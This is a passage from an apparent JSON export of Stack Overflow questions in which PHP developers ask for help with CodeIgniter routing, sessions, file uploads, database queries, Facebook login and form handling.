one.</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","mod-rewrite","clean-urls"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12863095,"title":"How to remove controller name from url making it clean in code igniter","body":"<p>I have the following url..</p>\n\n<pre><code>http://localhost/ci/site_controller/home\n</code></pre>\n\n<p>I want to remove <code>site_controller</code> <strong>controller</strong> from url resulting in..</p>\n\n<pre><code> http://localhost/ci/home\n</code></pre>\n\n<p>How can I do this in CodeIgniter ?</p>\n\n<p>Note: If you'll ask what I've tried than I've just done searching over Google as I don't know how to use mod_rewrite.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I have this in my routes.php</p>\n\n<pre><code>$route['default_controller'] = \"site_controller/home\";\n$route['ci/home'] = 'ci/site_controller/home';\n$route['404_override'] = '';\n</code></pre>\n\n<p>but still not working!</p>\n\n<p><strong>.htaccess</strong></p>\n\n<pre><code>RewriteEngine On\nRewriteBase /ci/\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n\nErrorDocument 404 /index.php\n</code></pre>\n"},{"tags":["php","codeigniter","login"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12857146,"title":"Codeigniter failed login direct access to controller","body":"<p>i have login form, and then i try to access the controller directly, it works ! how do i prevent this access ?</p>\n\n<p>i got some class</p>\n\n<pre><code>class C_home extends CI_Controller{\n\npublic function __construct() {\n    parent::__construct();\n    $this-&gt;session-&gt;set_userdata('islogin'); //to set session islogin\n}\n\nfunction index()\n{\n    if ($this-&gt;session-&gt;userdata('islogin') != TRUE) \n    {\n        redirect('c_home','refresh'); //caused infinite refresh\n    }\n        redirect('c_login', 'refresh');\n}\n}\n</code></pre>\n\n<p>then i try to direct access controller, the page show infinite refresh, i want the page to show the login form</p>\n\n<p>how do i resolve this ? </p>\n"},{"tags":["php","css","codeigniter"],"answer_count":7,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12855030,"title":"CSS Not Working With CodeIgniter","body":"<p>Here is a part of my CI code:</p>\n\n<pre><code>    class page extends CI_Controller {\n\n        var $Page;\n\n        public function __construct() {\n            parent::__construct();\n            $this-&gt;Page = 1;\n            $this-&gt;load-&gt;model('posts_model');\n            $this-&gt;load-&gt;helper('url');\n        }\n\n\n        public function index() {\n            $data['posts'] = $this-&gt;posts_model-&gt;get_posts($this-&gt;Page);\n            $this-&gt;load-&gt;view('header');\n            $this-&gt;load-&gt;view('main', $data);\n            $this-&gt;load-&gt;view('footer');\n        }\n\n        function page_num($page) {\n            $this-&gt;Page = $page;\n            $data['posts'] = $this-&gt;posts_model-&gt;get_posts($this-&gt;Page);\n            echo $this-&gt;Page;\n            $this-&gt;load-&gt;view('header');\n            $this-&gt;load-&gt;view('main', $data);\n            $this-&gt;load-&gt;view('footer');\n        }\n\n    }\n</code></pre>\n\n<p>And this is link tag of my View File:</p>\n\n<pre><code>&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"css/indexpage.css\" media=\"all\"/&gt;\n</code></pre>\n\n<p>When I open the index file (/My-Site/), CSS works fine, but when I open for </p>\n\n<p>example the url :</p>\n\n<p>\" /My-Site/page/page_num/3 \",</p>\n\n<p>the page opens but with no CSS styles!</p>\n\n<p>Can any body help me please?</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":12862770,"title":"Codeigniter active record \" symbol","body":"<p>How can I escape \" (double quotes) with Codeignniter Acitve Record?</p>\n\n<pre><code>$query_string = 'double \" quotes';\n$sql = \"SELECT * FROM name WHERE email LIKE \"%'.$query_string.'%\" \";\n$query = $this-&gt;db-&gt;query($sql);\n</code></pre>\n\n<p>I get mysql error </p>\n\n<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%\" OR email like \"%<strong>\"</strong>%\" </p>\n\n<p>Any suggestions how ti fix that</p>\n"},{"tags":["php","codeigniter","redirect","codeigniter-2","reload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12863349,"title":"How do I fully refresh the page in CodeIgniter?","body":"<p>I am loading a form in an overlay.  The overlay has a separate controller and action to the page that invokes the overlay.</p>\n\n<p>On form submit, if successful, I simply want to reload the referring page that the overlay was loaded from.  I can get the referring page to load, but it places the content inside the overlay.</p>\n\n<pre><code>header(\"Location: www.example.com\", true, 302);\n</code></pre>\n\n<p>does not work.</p>\n\n<p>Using the URL helper like this:</p>\n\n<pre><code>$url = $_SERVER['HTTP_REFERER'];\nredirect($url);\n</code></pre>\n\n<p>Also does not work.  Every time it loads in the overlay.  I am sad because of it.</p>\n"},{"tags":["php","codeigniter","file-upload","csv","xls"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":231,"score":0,"question_id":11965575,"title":"xls file is not uploading in codeigniter?","body":"<p>I want to upload csv file and xls file, my code has given below<br>`    </p>\n\n<pre><code>        `$configUpload['upload_path'] = './user_status/';`\n         $configUpload['allowed_types'] = 'XLS|text/comma-separated-values|application/csv|application/excel|application/vnd.ms-excel|application/vnd.msexcel|text/anytext|text/plain|text/csv|csv|application/vnd.ms-excel';\n         $configUpload['max_size'] = '5000';\n         $this-&gt;load-&gt;library('upload', $configUpload);\n         $this-&gt;upload-&gt;do_upload('input field name')`;\n</code></pre>\n\n<p>my csv file is uploading very well but when I choose xls file then codeigniter show error that \"The filetype you are attempting to upload is not allowed\".</p>\n\n<p>Result of print_r($_FILES) is </p>\n\n<pre><code>Array ( [user_status_csv] =&gt; Array ( [name] =&gt; VTRACK.XLS [type] =&gt; application/vnd.ms-excel [tmp_name] =&gt; C:\\xampp\\tmp\\phpB2C4.tmp [error] =&gt; 0 [size] =&gt; 2627412 ) ) \n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12755228,"title":"Store CI query into an array?","body":"<p>I've got the following function in a model, however it keep returning:</p>\n\n<p>Message: mysql_fetch_array(): supplied argument is not a valid MySQL result resource</p>\n\n<p>And I for the life of me can't figure out why.</p>\n\n<pre><code>    function getNames() {\n    $query1 = $this-&gt;db-&gt;query(\"SELECT * FROM Device_tbl ORDER BY Manufacturer\");   \n    $dev = array();\n    while($row = mysql_fetch_array($query1))\n        {\n            $manu =  $row['Manufacturer'];\n            $mod = $row['Model'];\n            $dev[] = $manu.' '.$mod;\n        }\n    return $dev-&gt;result();\n}\n</code></pre>\n\n<p>Can anyone help?</p>\n\n<p>Answer for CodeIgniter is:</p>\n\n<pre><code>    $query1 = $this-&gt;db-&gt;query(\"SELECT * FROM table\");  \n\n    foreach($query1-&gt;result_array() as $row)\n        {\n            $manu =  $row['column1'];\n            $mod = $row['column2'];\n            echo $manu.' '.$mod;\n        }\n    return $query1-&gt;result();\n</code></pre>\n"},{"tags":["php","codeigniter","view","controller"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12860395,"title":"Codeigniter How to pass value from view to view to update DB record","body":"<p>i have table here</p>\n\n<pre><code> &lt;?php     if ( !empty($kirim) ) \n                      {  \n                            $no = 1;   \n                            foreach ($kirim as $row) { ?&gt;  \n                            &lt;tr id=\"row\"&gt;  \n                             &lt;td id=\"no\"&gt;&lt;?php echo $no;?&gt;&lt;/td&gt;  \n                             &lt;td id=\"judul\"&gt;&lt;?php echo $row-&gt;Kode_Kategori_Material_Jasa;?&gt;&lt;/td&gt;  \n                             &lt;td id=\"kategori\"&gt;&lt;?php echo $row-&gt;Nama_Material_Jasa;?&gt;&lt;/td&gt;  \n                             &lt;td id=\"action\"&gt; Edit | Delete &lt;/td&gt;\n                         //idk how to pass the value for updating\n                        //and using YES or NO DialogResult for deleting\n                            &lt;/tr&gt;  \n                            &lt;?php  \n                             $no++;  \n                            }  \n                     } \n                     else { ?&gt;  \n            &lt;tr id=\"row\"&gt;  \n            &lt;td colspan=\"6\" align=\"center\"&gt;Tabel Kosong&lt;/td&gt;  \n            &lt;/tr&gt;  \n        &lt;?php  \n        }  \n        ?&gt;\n</code></pre>\n\n<p>and i want to pass the <code>Kode_Kategori_Material_Jasa</code> and <code>Nama_Material_Jasa</code> to another form, so we can update the values there, and update the DB record. i have made the form and i confuse to pass the value direct to the update form. or pass them to the controller, then pass it again to the update form. </p>\n\n<p>i was adding some code here</p>\n\n<pre><code>&lt;td id=\"action\"&gt; &lt;a href=\"&lt;?php echo site_url('/c_kategorimaterial/ubah/').$row-&gt;Kode_Kategori_Material_Jasa/$row-&gt;Nama_Material_Jasa; ?&gt; \"&gt;Edit &lt;/a&gt;| Delete &lt;/td&gt;                  \n</code></pre>\n\n<p>then i got error like <code>Division by zero</code> </p>\n"},{"tags":["codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12861064,"title":"CI multiple file upload - cannot upload more than 2 files","body":"<p>This function cannot upload more than 2 images.  If tried produces error,  </p>\n\n<p><em>Message : undefined index:userfile</em></p>\n\n<p><strong>View</strong><br>\n<code>&lt;input name=\"userfile[]\" id=\"userfile\" type=\"file\" multiple=\"\" /&gt;</code></p>\n\n<p><strong>Controller</strong></p>\n\n<pre><code> function do_upload() {\n\n    $count = count($_FILES['userfile']['size']);\n\n    foreach($_FILES as $key=&gt;$value){\n        for($n=0; $n&lt;=$count-1; $n++) {\n            $_FILES['userfile']['name']=$value['name'][$n];\n            $_FILES['userfile']['type']    = $value['type'][$n];\n            $_FILES['userfile']['tmp_name'] = $value['tmp_name'][$n];\n            $_FILES['userfile']['error']       = $value['error'][$n];\n            $_FILES['userfile']['size']    = $value['size'][$n];   \n\n                $config['upload_path'] = './images/';\n                $config['allowed_types'] = 'gif|jpg|png|jpeg';\n                                    $config['max_size']       = 0;\n\n            $this-&gt;load-&gt;library('upload', $config);\n            $this-&gt;upload-&gt;do_upload();\n            $data = $this-&gt;upload-&gt;data();\n        }\n    }   \n\n}\n</code></pre>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":12860061,"title":"CodeIgniter: Accessing Language Files from Config?","body":"<p>In one of my config files, I want to access language line items. How can I do that? I tried getting an instance of CI and accessing it that way (e.g. <code>$CI-&gt;lang-&gt;line('foo')</code>), but that didn't work. Suggestions?</p>\n"},{"tags":["php","codeigniter","email-verification"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1709,"score":2,"question_id":3424542,"title":"Verify email with codeigniter","body":"<p>How can I verify an email address with codeigniter? I just went through the manual, I couldn't find this.</p>\n\n<p>With email verification, i mean the exact same verification you see when registering on a community forum.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["php","codeigniter","controller"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12859152,"title":"Codeigniter can't pass value to controller","body":"<p>i have views here </p>\n\n<pre><code> &lt;?php echo form_open('c_kategorimaterial/tambah'); ?&gt;\n            &lt;table&gt;\n\n                &lt;tr&gt;\n                    &lt;td&gt;Kode Kategori Material / Jasa&lt;/td&gt; //primary key of table\n                    &lt;td&gt;&lt;?php $inkode=array('name' =&gt; 'kkmj', 'disabled' =&gt; 'disabled', 'value' =&gt; $nextval, 'class' =&gt; 'GUI'); echo form_input($inkode) ?&gt;&lt;/td&gt;\n                    &lt;td class=\"error\"&gt; &lt;?php echo form_error('kkmj'); ?&gt;&lt;/td&gt;\n                     //i make the form_input disabled, because the value is\n                     //auto generated from the last ID of table in database\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;Nama Material / Jasa&lt;/td&gt;\n                    &lt;td&gt;&lt;?php $innama=array('name' =&gt; 'nmj',  'class' =&gt; 'GUI'); echo form_input($innama) ?&gt;&lt;/td&gt;\n                    &lt;td class=\"error\"&gt; &lt;?php echo form_error('nmj'); ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n                &lt;tr&gt;\n                    &lt;td&gt;&lt;/td&gt;\n                    &lt;td&gt;&lt;?php $intambah=array('name' =&gt;'login','class' =&gt;'button','value' =&gt; 'Tambah'); echo form_submit($intambah); echo nbs(); $inreset=array('name' =&gt;'reset','class' =&gt;'button','value' =&gt; 'Hapus'); echo form_reset($inreset); ?&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n             &lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p>and it pass the value to the controller</p>\n\n<pre><code> function tambah()\n{\n   $id = $this-&gt;input-&gt;post('kkmj');\n   $nama = $this-&gt;input-&gt;post('nmj');\n\n    $this-&gt;form_validation-&gt;set_rules('nmj','Nama','trim|required|min_length[2]|max_length[20]|xss_clean');\n    if($this-&gt;form_validation-&gt;run() == false)\n    {\n        $lastval = $this-&gt;m_admin-&gt;getlastval('KKMJ','ms_kategori_material','kode_kategori_material_jasa');\n        $data['nextval'] = $this-&gt;m_admin-&gt;gencode('KKMJ',3,$lastval); \n        $data['title'] = 'QB Tambah Kategori Material';\n\n        $this-&gt;load-&gt;view('head',$data);\n        $this-&gt;load-&gt;view('content/add_kategori_material',$data);\n    }\n    else\n    {\n        echo 'id adalah '.$id.' namanya adalah '.$nama; //$id is not printed\n\n    }\n\n\n}\n</code></pre>\n\n<p>and then i fill the second field with 'water' and click the button. my page showing blank white screen with a text <code>id adalah namanya adalah water</code></p>\n\n<p>how come the ID is not printed ? how do i resolve this ? </p>\n"},{"tags":["php","codeigniter","multilanguage"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":120,"score":0,"question_id":12857419,"title":"PHP Codeigniter multi-language site use session variables to store language key","body":"<p>I am currently building a website with codeigniter 2.1.2. Now I am encountering a problem to efficiently building a multi-language website. </p>\n\n<p>I have read through the language class tutorial and helper and I have stored two language folders \"Chinese\" and \"English\". </p>\n\n<p>What I am intending to do is I want a language session variable called \"lang\". And I want the following: </p>\n\n<ol>\n<li>if no session variable \"lang\" exists, I will create one and point it to \"english\"</li>\n<li>if the session variable is already set and user clicked for a change of language, then the session variable will change from either \"chinese\" to \"english\" or \"english\" to \"chinese\". </li>\n</ol>\n\n<p>I am quite new to PHP and Codeigniter, All I can think of now is something like the following. Can anyone shine some light as of how I can efficiently allow users to change language on my site?</p>\n\n<p>I have no idea how to change session variable upon user's click event. </p>\n\n<pre><code>// Load Language Files \nif(!$this-&gt;session-&gt;userdata('lang')) {\n    $this-&gt;session-&gt;set_userdata('lang','english');\n    $lang = 'english';\n} else {\n    $lang = 'chinese';\n}\n$this-&gt;lang-&gt;load('pages/header',$lang);\n</code></pre>\n\n<p>I have created a language controller and set the session variable, and then redirect the page back to the previous page. Is it a good way?</p>\n\n<pre><code>  &lt;?php\n\nClass language Extends CI_Controller {\n\n    function index() {\n        if(!$this-&gt;session-&gt;userdata('lang')) {\n            $this-&gt;session-&gt;set_userdata('lang','english');\n        } else {\n            $lang = $this-&gt;session-&gt;userdata('lang');\n            if ($lang ==\"chinese\") {\n                $this-&gt;session-&gt;set_userdata('lang','english');\n            } elseif ($lang == \"english\") {\n                $this-&gt;session-&gt;set_userdata('lang','chinese');\n            } else {\n                $this-&gt;session-&gt;set_userdata('lang','english');\n            }\n        }\n        header('Location: ' . $_SERVER['HTTP_REFERER']);\n    }\n}\n</code></pre>\n"},{"tags":["php","database","codeigniter","facebook-graph-api"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12833643,"title":"Codeigniter Showing database error when redirected from facebook login","body":"<p>I'm trying to create facebook login,</p>\n\n<p>Login button on my site redirect me to facebook, for login, ask to permit my application for required permission ('offline_access,email etc').</p>\n\n<p>When user allow it returns to my inside page(User Page). Also add the user data to my database if user's facebook id is not in my database.</p>\n\n<p>but it is not working every time (in both case if user in database or not). sometime it gives following error:</p>\n\n<pre><code>A Database Error Occurred\n\nUnable to connect to your database server using the provided settings.\n\nFilename: core/Loader.php\n\nLine Number: 346\n</code></pre>\n\n<p>This is my login function which generate the fb login url</p>\n\n<pre><code>$this-&gt;load-&gt;library('facebook');\n        $user = $this-&gt;facebook-&gt;getUser();\n        $data['loginUrl']=\"\";\n        $data['logoutUrl']=\"\";\n        if ($user) {\n            try {\n                $data['user_profile'] = $this-&gt;facebook-&gt;api('/me');\n            } catch (FacebookApiException $e) {\n                error_log($e);\n                $user = null;\n            }\n        }\n        if ($user) {\n            $data['logoutUrl'] = $this-&gt;facebook-&gt;getLogoutUrl(array(\n                'next' =&gt; ASITEURL . '/login/logout'));\n        } else {\n            $param['redirect_uri'] = ASITEURL . '/login/checkLogInfo';\n            $param['scope'] = 'email,publish_stream,user_birthday';\n            $data['loginUrl'] = $this-&gt;facebook-&gt;getLoginUrl($param);\n        }\n        $this-&gt;load-&gt;view('login/login', $data);\n</code></pre>\n\n<p>checkLogInfo is function which handles the session and database code.</p>\n\n<p>Fb Redirect me to following url after successful login (and granting permission first time):</p>\n\n<pre><code>http://mysite.com/login/checkLogInfo?state=4d59a4fe681ae940f036393c895d1c57&amp;code=AQA3gAnl86izonBQyh8wThjNZuNowX1h6YBlGkeIiaQU__DFHDywC9nIgWYzW22EaxkVJB5nudjnNd4uElNs1-SFa0Ej_h4_4AAaYh4bLf9_HBpUiaSzbuDUcYg0WIIg0B4mvKq0_H3W3xH0gcKPWL1Fbrp3ff3IVt0unFIIeyevRb9oZwPld6NTKtU_tHxrQFtEdMgE6S2dwPcrbyY54g82#_=_\n</code></pre>\n\n<p>Database Setting :</p>\n\n<pre><code>    $db['default']['hostname'] = 'localhost';\n    $db['default']['username'] = 'root';\n    $db['default']['password'] = '';\n    $active_group = 'default';\n    $active_record = TRUE;\n\n$db['default']['database'] = 'mydb';\n    $db['default']['dbdriver'] = 'mysql';\n    $db['default']['dbprefix'] = '';\n    $db['default']['pconnect'] = FALSE;\n    $db['default']['db_debug'] = TRUE;\n    $db['default']['cache_on'] = FALSE;\n    $db['default']['cachedir'] = '';\n    $db['default']['char_set'] = 'utf8';\n    $db['default']['dbcollat'] = 'utf8_general_ci';\n    $db['default']['swap_pre'] = '';\n    $db['default']['autoinit'] = TRUE;\n    $db['default']['stricton'] = FALSE;\n</code></pre>\n\n<p>Thanks </p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":85,"score":0,"question_id":12853653,"title":"Updating Entry in db via Codeigniter and not getting the previous values","body":"<p>When I am trying to update data into db in codeigniter, I am getting form table values empty while I should get the previous entries so that I can Update. The update form should contain the existing values in editable format.</p>\n\n<p>Here is my Controller</p>\n\n<pre><code>&lt;?php\n\nclass Person extends CI_Controller {\n\n    // num of records per page\n    private $limit = 15;\n\n    function __construct() {\n        parent::__construct();\n\n\n        // $this-&gt;load-&gt;library('table','form_validation');\n        $this-&gt;load-&gt;library('table');\n        $this-&gt;load-&gt;library('form_validation');\n        // $this-&gt;form_validation-&gt;set_rules();\n\n\n        $this-&gt;load-&gt;helper('url');\n\n\n        $this-&gt;load-&gt;model('personModel', '', TRUE);\n    }\n\n    function index($offset = 0) {\n\n        $uri_segment = 3;\n        $offset = $this-&gt;uri-&gt;segment($uri_segment);\n\n        // load data\n        $persons = $this-&gt;personModel-&gt;get_paged_list($this-&gt;limit, $offset)-&gt;result();\n\n        // have pagntn\n        $this-&gt;load-&gt;library('pagination');\n        $config['base_url'] = site_url('person/index/');\n        $config['total_rows'] = $this-&gt;personModel-&gt;count_all();\n        $config['per_page'] = $this-&gt;limit;\n        $config['uri_segment'] = $uri_segment;\n        $this-&gt;pagination-&gt;initialize($config);\n        $data['pagination'] = $this-&gt;pagination-&gt;create_links();\n\n        // generate table data\n        $this-&gt;load-&gt;library('table');\n        $this-&gt;table-&gt;set_empty(\"&amp;nbsp;\");\n        $this-&gt;table-&gt;set_heading('No', 'Name', 'Gender', 'Education', 'Date of Birth (dd-mm-yyyy)', 'Interest');\n        $i = 0 + $offset;\n        foreach ($persons as $person) {\n            $this-&gt;table-&gt;add_row(++$i, $person-&gt;name, strtoupper($person-&gt;gender) == 'M' ? 'Male' : 'Female',\n                    // ($person-&gt;education), date('d-m-Y', strtotime($person-&gt;dob)), ($person-&gt;interest), anchor('person/view/' . $person-&gt;id, 'view', array('class' =&gt; 'view', 'onclick' =&gt; \"return confirm('View Full Details?')\")) . ' ' .\n                    ($person-&gt;education), date('d-m-Y', strtotime($person-&gt;dob)), ($person-&gt;interest), anchor('person/view/' . $person-&gt;id, 'view', array('class' =&gt; 'view')) . ' ' .\n                    anchor('person/update/' . $person-&gt;id, 'Edit', array('class' =&gt; 'update')) . ' ' .\n                    anchor('person/delete/' . $person-&gt;id, 'delete', array('class' =&gt; 'delete', 'onclick' =&gt; \"return confirm('Are you sure want to delete this person?')\"))\n            );\n        }\n        $data['table'] = $this-&gt;table-&gt;generate();\n        $this-&gt;load-&gt;library('table');\n        $this-&gt;load-&gt;library('form_validation');\n\n        // load view\n        $this-&gt;load-&gt;view('personList', $data);\n    }\n\n    function add() {\n\n        // set validation propert/ies\n        //  $this-&gt;set_fields();\n        //echo\"hello\";\n        //\n          //  exit;\n        // set common properties\n        $data['title'] = 'Add new person';\n        $data['message'] = '';\n        $data['action'] = site_url('person/addPerson');\n        $data['link_back'] = anchor('person/index/', 'Back to list of persons', array('class' =&gt; 'back'));\n\n        // load view\n        $this-&gt;load-&gt;view('personEdit', $data);\n    }\n\n    function addPerson() {\n        // set common properties\n        $data['title'] = 'Add new person';\n        $data['action'] = site_url('person/addPerson');\n        $data['link_back'] = anchor('person/index/', 'Back to list of persons', array('class' =&gt; 'back'));\n\n        // set validation properties\n        $this-&gt;set_fields();\n        $this-&gt;set_rules();\n\n//  \n        $this-&gt;load-&gt;view('personEdit', $data);\n    }\n\n    function view($id) {\n        // set common properties\n        $data['title'] = 'Person Details';\n        $data['link_back'] = anchor('person/index/', 'Back to list of persons', array('class' =&gt; 'back'));\n\n        // get person details\n        $data['person'] = $this-&gt;personModel-&gt;get_by_id($id)-&gt;row();\n\n        // load view\n        $this-&gt;load-&gt;view('personView', $data);\n    }\n\n    function update($id) {\n        $this-&gt;set_fields();\n\n        // prefill form values\n        $person = $this-&gt;personModel-&gt;get_by_id($id)-&gt;row();\n        $this-&gt;form_validation-&gt;name = $person-&gt;name;\n        $_POST['gender'] = strtoupper($person-&gt;gender);\n        $this-&gt;form_validation-&gt;dob = date('d-m-Y', strtotime($person-&gt;dob));\n        $data = array(\n            'id' =&gt; $id,\n            'name' =&gt; $this-&gt;input-&gt;post('name'),\n            'gender' =&gt; $this-&gt;input-&gt;post('gender'),\n            'dob' =&gt; $this-&gt;input-&gt;post('dob'),\n            'education' =&gt; $this-&gt;input-&gt;post('education'),\n            'interest' =&gt; $this-&gt;input-&gt;post('interest')\n        );\n\n\n\n        // set common properties\n        // load view\n        $this-&gt;load-&gt;view('personEdit', $data);\n    }\n\n    function update_action() {\n\n        $this-&gt;set_fields();\n\n        $id = $this-&gt;input-&gt;post('emp_id');\n        // prefill form values\n        $person = $this-&gt;personModel-&gt;get_by_id($id)-&gt;row();\n        $data = array(\n            'name' =&gt; $this-&gt;input-&gt;post('name'),\n            'gender' =&gt; $this-&gt;input-&gt;post('gender'),\n            'dob' =&gt; $this-&gt;input-&gt;post('dob'),\n            'education' =&gt; $this-&gt;input-&gt;post('education'),\n            'interest' =&gt; $this-&gt;input-&gt;post('interest')\n        );\n\n\n        $this-&gt;db-&gt;where('id', $id);\n        $this-&gt;db-&gt;update('tbl_person', $data);\n\n\n        redirect('person', 'view');\n\n        $data['message'] = '&lt;div class=\"success\"&gt;update person success&lt;/div&gt;';\n        echo $data['message'];\n    }\n\n    function delete($id) {\n        // delete person\n        $this-&gt;personModel-&gt;delete($id);\n\n        // redirect to person list page\n        redirect('login/index/', 'refresh');\n    }\n\n    // validation fields\n    function set_fields() {\n        // $this-&gt;form_validation-&gt;set_rules('id', 'name', 'gender','dob','education','interest', 'required');\n\n\n        $fields['id'] = 'id';\n        $fields['name'] = 'name';\n        $fields['gender'] = 'gender';\n        $fields['dob'] = 'dob';\n        $fields['education'] = 'educaiton';\n        $fields['interest'] = 'interest';\n\n\n\n        //  $this-&gt;validation-&gt;set_fields('$fields');\n        //echo\"hellofff\";\n        //exit;\n    }\n\n    // validation rules\n    function set_rules() {\n        $rules['name'] = 'trim|required';\n        $rules['gender'] = 'trim|required';\n        $rules['dob'] = 'trim|required|callback_valid_date';\n        $rules['education'] = 'trim|required';\n        $rules['interest'] = 'trim|required';\n        $this-&gt;form_validation-&gt;set_rules($rules);\n\n        $this-&gt;form_validation-&gt;set_message('required', '* required');\n        $this-&gt;form_validation-&gt;set_message('isset', '* required');\n        $this-&gt;form_validation-&gt;set_error_delimiters('&lt;p class=\"error\"&gt;', '&lt;/p&gt;');\n    }\n\n    function form_validation() {\n        $this-&gt;add();\n    }\n\n    // date_validation callback\n    function valid_date($str) {\n        if (!ereg(\"^(0[1-9]|1[0-9]|2[0-9]|3[01])-(0[1-9]|1[012])-([0-9]{4})$\", $str)) {\n            $this-&gt;form_validation-&gt;set_message('valid_date', 'date format is not valid. dd-mm-yyyy');\n            return false;\n        } else {\n            return true;\n        }\n    }\n\n}\n\n?&gt;\n</code></pre>\n\n<p>How can I get those values into the fields. </p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12856251,"title":"CodeIgniter Validation: using PHP functions","body":"<p>I'd like to use <code>htmlentities</code> as part of my CI validation/prepping process. CI says I can use any function that accepts 1 parameter, like htmlentities. However, I actually need to use it this way:</p>\n\n<pre><code>htmlentities($foo, ENT_COMPAT, 'UTF-8');\n</code></pre>\n\n<p>Meaning, I need to pass it flags and an encoding. Is there a way I can make this part of CI validation without trying to create a callback?</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12848863,"title":"how to redirect user depending on user type at time of login (codeignitor)","body":"<p>im facing problem while redirecting my user according to its type. how can do it here's my code plz suggest how to do it. </p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass VerifyLogin extends CI_Controller {\n\nfunction __construct()\n{\n  parent::__construct();\n  }\n\n function index()\n{\n       $this-&gt;load-&gt;model('user','',TRUE);\n\n  //This method will have the credentials validation\n   $this-&gt;load-&gt;library('form_validation');\n   $this-&gt;load-&gt;library('session');\n\n   $this-&gt;form_validation-&gt;set_rules('username', 'Username','trim|required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password'\n      'trim|required|xss_clean|callback_check_database');\n\n      if($this-&gt;form_validation-&gt;run() == FALSE)\n      {        \n\n //Field validation failed.&amp;nbsp; User redirected to login page\n  validation_errors();\n\n $this-&gt;load-&gt;view('error');\n  }\n else\n  {\n //Go to private area\n</code></pre>\n\n<p>basically here i want to redirect if user is admin then redirect to admin page else        redirect to home        how can i do this ???</p>\n\n<pre><code>        redirect('home', 'refresh');\n     }\n\n\n    }\n\n\n\n\n       function check_database($password)\n   {\n    //Field validation succeeded.&amp;nbsp; Validate against database\n      $username = $this-&gt;input-&gt;post('username');\n\n       //query the database\n       $result = $this-&gt;user-&gt;login($username, $password);\n\n     if($result)\n     {\n      $sess_array = array();\n       foreach($result as $row)\n      {\n       $sess_array = array(\n     'id' =&gt; $row-&gt;id,\n     'username' =&gt; $row-&gt;username\n   );\n   $this-&gt;session-&gt;set_userdata('logged_in', $sess_array);\n\n        }\n      return TRUE;\n    }\n    else\n     {\n $this-&gt;form_validation-&gt;set_message('check_database', 'Invalid username or password');\n return false;\n    }\n   }  \n     }\n  ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","activerecord","foreach"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12850682,"title":"Codeigniter view shows 0 record","body":"<p>i've insert 5 rows into <code>ms_kategori_material</code> table, and made some model here </p>\n\n<pre><code>function read()\n{   \n    $query = $this-&gt;db-&gt;get('ms_kategori_material');\n\n    if($query-&gt;num_rows()&gt;0)\n    {            \n        foreach ($query-&gt;result_array() as $value) {\n            echo $value['Kode_Kategori_Material_Jasa'];\n            echo $value['Nama_Material_Jasa'];\n        }\n        return $value;\n    }\n    else\n    {\n        return null;\n    }\n}\n</code></pre>\n\n<p>and controllers </p>\n\n<pre><code>function index()\n{\n      $data['kirim'] = $this-&gt;m_kategorimaterial-&gt;read();\n      echo $data; //returns KKMJ001batuKKMJ002batuKKMJ003batuKKMJ004batuKKMJ005batuArray\n      $this-&gt;load-&gt;view('v/vkategorimaterial',$data);\n\n}\n</code></pre>\n\n<p>and the views</p>\n\n<pre><code>&lt;?php  \n                if ( !empty($kirim) ) {  \n                 $no = 1;   \n                 foreach ($kirim as $row) { ?&gt;  \n                 &lt;tr id=\"row\"&gt;  \n                  &lt;td id=\"no\"&gt;&lt;?php echo $no;?&gt;&lt;/td&gt;  \n                  &lt;td id=\"judul\"&gt;&lt;?php echo $row-&gt;Kode_Kategori_Material_Jasa;?&gt;&lt;/td&gt;  \n                  &lt;td id=\"kategori\"&gt;&lt;?php echo 